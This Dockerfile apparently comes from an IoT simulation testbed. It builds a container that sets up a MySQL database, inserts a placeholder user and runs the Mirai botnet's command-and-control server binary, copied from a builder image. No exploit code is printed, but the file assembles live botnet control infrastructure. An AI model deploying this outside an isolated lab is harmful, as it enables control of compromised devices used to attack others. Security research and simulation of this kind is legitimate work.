FROM ubuntu:focal

RUN apt update && DEBIAN_FRONTEND=noninteractive apt install -y --no-install-recommends \
    mysql-server \
    mysql-client \
    && rm -rf /var/lib/apt/lists/*

RUN mkdir -p /var/run/mysqld &&\
    chown mysql:mysql /var/run/mysqld

WORKDIR /opt
COPY --from=iotsim/mirai-builder:latest /opt/Mirai-Source-Code/mirai/debug/cnc ./
COPY --from=iotsim/mirai-builder:latest /opt/Mirai-Source-Code/mirai/prompt.txt ./
COPY --from=iotsim/mirai-builder:latest /opt/Mirai-Source-Code/scripts/db.sql ./

RUN echo "#!/bin/bash" > /init_cmd.sh &&\
    echo "set -e" >> /init_cmd.sh &&\
    echo "service mysql start" >> /init_cmd.sh &&\
    echo "sleep 2" >> /init_cmd.sh &&\
    echo "if mysqlshow | grep 'mirai'; then" >> /init_cmd.sh &&\
    echo "    echo 'DB exists'" >> /init_cmd.sh &&\
    echo "else" >> /init_cmd.sh &&\
    echo "    mysql < /opt/db.sql" >> /init_cmd.sh &&\
    echo "    mysql -e 'use mirai; INSERT INTO users VALUES (NULL, \"!PLACEHOLDER-MIRAI_DB_USERNAME!\", \"!PLACEHOLDER-MIRAI_DB_PASSWORD!\", 0, 0, 0, 0, -1, 1, 30, \"\");'" >> /init_cmd.sh &&\
    echo "fi" >> /init_cmd.sh &&\
    echo "mysql -e 'use mirai; select * from users;'" >> /init_cmd.sh &&\
    echo "/opt/cnc" >> /init_cmd.sh &&\
    chmod +x /init_cmd.sh

CMD ["/init_cmd.sh"]
